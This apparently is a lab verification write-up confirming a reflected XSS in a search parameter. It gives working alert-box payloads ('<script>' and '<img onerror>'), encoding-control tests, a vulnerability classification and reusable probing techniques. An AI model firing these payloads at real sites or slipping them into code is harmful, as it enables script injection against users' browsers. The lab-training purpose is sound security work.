# Verification — Reflected XSS (HTML text context)

## Evidence (all served from the lab origin)

1. **Benign marker (control):**
   `GET /?search=zzmarker123` → `200`, body contains
   `<h1>0 search results for 'zzmarker123'</h1>`. Lab status: NOT solved.
   → Reflection point identified; single reflection location.

2. **Primary primitive:**
   `GET /?search=<script>alert(1)</script>` → `200`, body contains
   `<h1>0 search results for '<script>alert(1)</script>'</h1>`.
   → Payload is in element-text context, unencoded, in the initial document.
   → Lab widget flips to **Solved** (server-side headless victim executed alert).

3. **Independent second primitive:**
   `GET /?search=<img src=x onerror=alert(2)>` → reflected verbatim.
   → Confirms markup is parsed generically, not just `<script>`.

4. **Encoding control:**
   `GET /?search=%3Cscript%3E...%3C/script%3E` (percent-encoded tags)
   → reflected literally as `%3Cscript%3E...` — the server performs no HTML
   encoding and no second decoding pass. Verbatim reflection confirmed.

Every request observed: `HTTP/2 200`, `set-cookie: session=…; Secure; HttpOnly;
SameSite=None` (session cookie is HttpOnly — relevant to impact, below).

## Classification

- **CONFIRMED:** reflected XSS; attacker-controlled script executes in a viewer's
  browser in the lab origin (alert fired in emulated victim).
- **PLAUSIBLE (not tested on this lab):** session/account/data impact chained
  from the XSS — the app has no sensitive same-origin endpoints to demonstrate,
  and the session cookie is HttpOnly (cookie theft blocked, in-session actions
  still available via same-origin fetch in a real app).
- **NOT APPLICABLE:** XXE (no XML parse), SSRF (no URL-fetch sink), path
  traversal (no file sink), command injection (no OS sink), CSTI (no template
  sink), SQLi (search is parameterized/no database error behavior), CSRF as *the*
  vulnerability (reflected XSS is the vulnerability; CSRF-chaining is a use).

## Reusable verification techniques

- Marker-then-payload discipline: prove reflection with a benign token, THEN
  confirm execution — never payload first.
- Read the exact reflection CONTEXT (element text vs attribute vs script vs
  comment) before choosing the primitive.
- Use an event-handler primitive (`<img src=x onerror=…>`) as an independent
  confirmation that markup parsing (not a script-specific quirk) is the issue.
- Double-encode control (`%253C`) to distinguish "truly unencoded host" from
  "encoded once and decoded again elsewhere".
- No browser MCP? Drive plain headless Chromium (`--headless=new --dump-dom`) or
  rely on the platform's victim emulator flipping the status marker.